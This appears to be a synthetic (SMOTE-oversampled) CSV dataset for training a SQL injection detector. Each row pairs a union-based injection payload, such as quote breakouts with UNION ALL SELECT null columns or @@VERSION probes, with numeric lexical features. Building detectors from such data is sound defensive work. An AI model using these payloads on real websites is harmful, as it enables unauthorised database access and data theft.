id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000110,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.8509523480546544,58.313800869832356,16.85538744563548,3.2701796602571696,40.313800869832356,1.0,7.421549782541911,9.578450217458089,0.6889008967403231,0.017283283514426512,0.13023223731738298,0.16358358242786752,1.0,0.0,0.2892251087290443,0.0,0.0,0.0,0.0,0.8553874456354779,1.0,0.0,5.578450217458089,0.28922510872904406,1.0,0.0,0.14461255436452214,0.855387445635478,0.0,0.0,0.8553874456354779,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.0932948962341908,73.78404812880952,20.0239946523545,3.6447578635581146,13.999999999999998,39.904021390582,7.904021390582008,11.976005347645502,0.18981773933402635,0.5408598041061721,0.1069906856283976,0.16233177093140394,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.976005347645502,0.023994652354498047,0.0,7.9760053476455015,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.976005347645502,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,0.8907553882113498,69.22324602538832,16.0,3.059747113728064,51.91743451904124,1.0,3.999999999999999,12.305811506347078,0.75,0.014577567950052495,0.05831027180021002,0.1771121602497375,1.0,0.0,1.6529057531735394,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.47935862976031,1.652905753173539,1.0,0.0,0.8264528765867696,0.17354712341323042,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,3.4413042516542243,57.054008311892204,22.054008311892204,3.821931889422577,21.90506233919153,14.202954284592877,15.054008311892204,5.891983376215591,0.38175103898652557,0.2507035941192602,0.2636294178261923,0.10391594906802201,0.47299584405389783,0.5270041559461022,0.47299584405389794,0.0,0.0,0.5270041559461022,0.0,1.472995844053898,0.0,0.0,1.4189875321616938,1.0,0.47299584405389783,0.5270041559461022,0.0,1.0,0.0,0.5270041559461022,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.5270041559461022,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.527004155946102
SMOTE_000114,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.1770961703942793,75.91041833312038,31.2716653335037,4.329830796706894,43.2716653335037,2.1820836666240755,18.09250199974445,12.36416733324815,0.5708860822259135,0.02863923972176083,0.23774342305296453,0.1627312549993611,0.5462509998722241,0.0,2.0,0.0,1.8179163333759252,1.0,0.0,0.36416733324814954,0.0,0.0,1.0,6.635832666751851,0.18208366662407477,0.0,1.0,0.0,0.0,1.0,0.18208366662407466,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000115,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.4437238820267506,68.92132209217075,18.651652615213443,3.5279065614434217,23.70810117046321,29.482890398664853,3.999999999999999,11.730330523042689,0.35036116290953123,0.4214176286189848,0.05807677740937596,0.17014443106210803,1.0,0.0,2.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.7303305230426886,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000116,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.6705993059115027,61.190345829084855,19.0,3.6572332706383186,13.999999999999998,32.95227666326788,3.999999999999999,10.23806916581697,0.23203510607605507,0.5348170216273656,0.0662957445931586,0.1668521277034207,0.41268972193899023,0.5873102780610095,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.238069165816971,3.0,0.4126897219389904,0.5873102780610095,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000117,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.05838171200176555,61.023468477827166,21.988265761086417,3.7919200226663548,13.999999999999998,24.0,14.0,9.023468477827162,0.2294227013558209,0.39329605946712154,0.2294227013558209,0.14785853782123665,-5.551115123125783e-17,1.0,1.0234684778271623,0.0,0.0,0.0,0.0,2.0,0.011734238913581052,0.0,4.0,1.0234684778271623,0.0,1.0,0.011734238913581052,0.988265761086419,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000118,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.6292209527587247,73.0,32.38517669793271,4.376921863114401,43.22964660413458,2.3851766979327103,17.0,10.38517669793271,0.5921869397826655,0.03267365339633849,0.2328767123287671,0.1422626944922289,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.38517669793271,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.38517669793271
SMOTE_000119,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,2.409926635719938,68.87101997669582,20.128980023304177,3.562503632697557,37.87101997669582,5.7188343123476315,15.640582843826184,9.640582843826184,0.5487757615769138,0.08605311017531783,0.22625242590676353,0.1389187023410049,-5.551115123125783e-17,1.0,2.0,0.0,0.0,0.5898542890434539,0.0,1.8202914219130921,0.0,0.0,4.230437132869638,2.589854289043454,0.0,1.0,1.0,0.0,0.0,0.5898542890434539,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.589854289043454
SMOTE_000120,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,0.44452622655875373,66.64488623885815,20.088778440285463,3.641836968521401,13.999999999999998,24.0,17.64488623885815,11.0,0.21013304730063634,0.3602280810868051,0.26453433444777286,0.16510453716478568,0.9112215597145372,0.08877844028546289,3.0,0.0,0.0,0.0,0.0,2.911221559714537,0.08877844028546265,0.0,4.0,3.0,0.9112215597145371,0.08877844028546289,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.9191005403072692,73.81547739541922,32.0,4.382533673618947,42.815477395419215,2.5922613022903906,17.0,11.407738697709608,0.5799597806863919,0.035212537512500613,0.23034463639778507,0.1544830454033224,-5.551115123125783e-17,0.0,2.0,0.0,1.4077386977096085,1.0,0.0,0.0,0.0,0.0,1.0,5.815477395419217,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.5922613022903918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.592261302290392
SMOTE_000122,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,0.0325866851427027,67.01834478925433,19.993885070248556,3.623509986486341,13.999999999999998,24.097838876023108,17.91439098347978,11.006114929751444,0.2089004633156587,0.35951277819860217,0.26736332402698665,0.16422343445875248,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.9816552107456675,0.0,0.0,4.024459719005777,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9938850702485558,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,1.7827997279966399,73.75702169398706,32.62148915300647,4.398857798042791,42.757021693987056,2.6214891530064737,17.0,11.378510846993526,0.5796287986326207,0.03563427271004774,0.230526142685337,0.1542107859719945,-5.551115123125783e-17,0.0,2.0,0.0,1.3785108469935263,1.0,0.0,0.0,0.0,0.0,1.0,5.757021693987053,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.6214891530064734,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.621489153006474
SMOTE_000124,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,1.1424981306667261,63.817414424020576,20.290448654412348,3.6107366960063927,13.999999999999998,35.053931539216464,3.999999999999999,10.763482884804116,0.21962979437531077,0.5489945207139306,0.06275136982151736,0.16862431508924133,-5.551115123125783e-17,1.0,1.4730342303917683,0.0,0.0,0.0,0.0,0.0,0.7634828848041159,0.0,6.763482884804116,1.4730342303917683,0.0,1.0,0.23651711519588403,0.763482884804116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000125,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.05719878217771733,68.95268324152607,21.0,3.5363853453211362,13.999999999999998,39.952683241526074,3.999999999999999,11.0,0.2030462507510892,0.579404194872744,0.0580132145003112,0.15953633987585578,0.988170810381519,0.01182918961848134,1.0,0.0,0.0,0.0,0.0,0.0,0.011829189618481034,0.0,7.9881708103815185,1.0,0.9881708103815189,0.01182918961848134,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,1.0515261614028337,74.55349549168297,32.22325225415851,4.397525420193244,43.55349549168297,2.2232522541585134,17.0,11.776747745841487,0.5841385132862414,0.029888023393337487,0.2280530733591579,0.15792038996126315,-5.551115123125783e-17,0.0,2.0,0.0,1.7767477458414862,1.0,0.0,0.0,0.0,0.0,1.0,6.553495491682972,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.22325225415851388,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.223252254158513
SMOTE_000127,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,0.3774040480400827,74.70960700036892,32.0,4.391784817345414,44.0,2.0,17.0,11.709607000368923,0.5890004186271721,0.02677274630123508,0.22756834356049832,0.15665849151109446,-5.551115123125783e-17,0.0,2.0,0.0,1.8548035001844618,1.0,0.0,0.0,0.0,0.0,1.0,6.7096070003689245,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000128,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.03173345170914829,73.0,31.982147100285154,4.361896873104961,44.0,2.0,17.0,10.0,0.6027397260273972,0.0273972602739726,0.2328767123287671,0.136986301369863,-5.551115123125783e-17,0.0,2.0,0.0,1.017852899714848,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000129,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,1.670189308658605,61.206485262451594,16.0,3.128385458058217,45.90486394683869,1.0,3.999999999999999,10.301621315612898,0.75,0.016565851869431658,0.0662634074777266,0.16717074065284176,1.0,0.0,0.650810657806449,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.976215986709674,0.650810657806449,1.0,0.0,0.3254053289032244,0.6745946710967756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,2.1580600732831,71.6883284460831,20.46233431078338,3.594166561026263,13.999999999999998,40.0,6.1506627568664785,11.53766568921662,0.19552749740596095,0.5586499925884598,0.08492800948677139,0.1608945005188078,0.4623343107833802,0.5376656892166196,1.0,0.0,0.0,0.0,0.0,0.5376656892166197,0.0,0.0,8.0,1.0,0.4623343107833803,0.5376656892166196,0.0,1.0,0.0,0.0,0.5376656892166196,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,1.364843141654826,68.47124235177887,15.0,3.039440059675985,50.0,1.0,6.471242351778862,11.0,0.7308307104785837,0.014616614209571666,0.09376991900655617,0.1607827563052884,0.38218941205528423,0.0,2.0,0.0,0.0,0.0,0.0,0.6178105879447157,0.0,0.0,8.0,2.0,0.38218941205528434,0.0,1.0,0.0,0.0,0.0,0.6178105879447156,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.4260246290719014,57.992765405363855,18.40144691892723,3.5785085872035998,13.999999999999998,30.394212324291082,3.999999999999999,9.59855308107277,0.24184887403785033,0.5236012868138853,0.06909967829652866,0.16545016085173567,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.598553081072771,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000018,0.5484005551346017,70.2904695932213,16.0,3.0506097001401677,52.71785219491598,1.0,3.999999999999999,12.572617398305326,0.75,0.014312879565173298,0.05725151826069315,0.17843560217413354,1.0,0.0,1.7863086991526624,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.679463048728993,1.786308699152662,1.0,0.0,0.8931543495763312,0.10684565042366889,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,2.4344675050798408,73.0,28.764164868744544,4.200955672682319,42.613213515176234,5.235835131255456,16.075475676784155,9.075475676784155,0.5837426508928251,0.0717237689213076,0.2202119955723857,0.12432158461348157,0.4622621616079221,0.0,2.0,0.0,0.5377378383920778,1.0,0.0,0.4622621616079223,0.0,0.0,1.4622621616079226,4.5377378383920774,0.4622621616079223,0.0,1.0,0.0,0.0,1.0,0.4622621616079223,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.5377378383920778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.5377378383920774
SMOTE_000135,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.2986226623223597,69.66551344617965,15.0,3.048114906617997,50.0,1.0,7.665513446179645,11.0,0.7179056986344194,0.01435811397268838,0.1097969336933199,0.15793925369957226,0.08362163845508874,0.0,2.0,0.0,0.0,0.0,0.0,0.9163783615449113,0.0,0.0,8.0,2.0,0.08362163845508869,0.0,1.0,0.0,0.0,0.0,0.9163783615449113,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.7223308136035643,71.51056968864825,15.125880807387354,3.053383566388353,50.0,1.0,9.258808073873533,11.251761614774708,0.7011274417365136,0.01402254883473028,0.12753170865190966,0.15731830077684647,0.1258808073873533,0.0,1.7482383852252934,0.0,0.0,0.0,0.0,1.251761614774707,0.0,0.0,8.0,1.7482383852252932,0.1258808073873534,0.0,0.8741191926126466,0.1258808073873534,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,1.495087827213964,66.27365728097399,21.030179029203467,3.814982757179097,13.999999999999998,33.81892582477919,8.0,10.454731456194798,0.2139644521452964,0.5065630370578793,0.12226540122588367,0.15720710957094072,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.454731456194798,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,0.8555237156400265,71.0850207578777,16.63832641404077,3.2296216588196547,37.53171510171463,4.032050466693644,18.0,11.521255189469425,0.5201536785525049,0.0638344179902893,0.2543161074238045,0.1616957960334012,-5.551115123125783e-17,0.8404183964898082,2.159581603510192,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.521255189469425,2.159581603510192,0.0,0.8404183964898082,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,0.30827106257124376,72.3099750772785,16.230008307573833,3.1836645045326435,40.38994184698316,2.0925394609757095,18.0,11.827493769319625,0.5554562770231471,0.03176407041858262,0.2493645741318183,0.16341507842645195,-5.551115123125783e-17,0.9424979231065416,2.057502076893458,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.827493769319625,2.0575020768934587,0.0,0.9424979231065416,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.22289007787443732,69.0567943641369,20.886411271726185,3.5414456961790544,13.999999999999998,40.0,3.999999999999999,11.056794364136907,0.20273392937931334,0.5792397982266095,0.05792397982266097,0.16010229257141625,1.0,0.0,1.1135887282738128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.1135887282738133,1.0,0.0,0.056794364136906306,0.9432056358630936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.3680085878966237,66.9933086244316,15.9933086244316,3.1765312306343296,41.06022238011559,10.684759088208114,3.999999999999999,11.2483271561079,0.6191145553822617,0.15329021454487096,0.05974605313902026,0.16784917693384713,1.0,0.0,2.2483271561079006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.2483271561079006,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
